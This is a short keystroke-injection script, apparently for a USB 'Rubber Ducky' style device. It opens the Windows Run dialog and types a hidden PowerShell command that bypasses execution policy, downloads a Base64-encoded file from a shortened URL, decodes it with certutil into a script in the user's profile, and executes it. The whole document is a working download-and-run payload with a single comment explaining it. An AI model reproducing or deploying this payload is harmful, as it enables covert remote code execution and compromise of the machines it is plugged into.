REM this script downloads an encoded Base64 file using irm and then decodes it then executes

DELAY 2000
GUI r
DELAY 1000
STRING powershell -NoP -W H -Ep Bypass iwr t.ly/2rDuD -O$env:USERPROFILE\e.txt;cer -f -decode$env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
DELAY 1000
ENTER
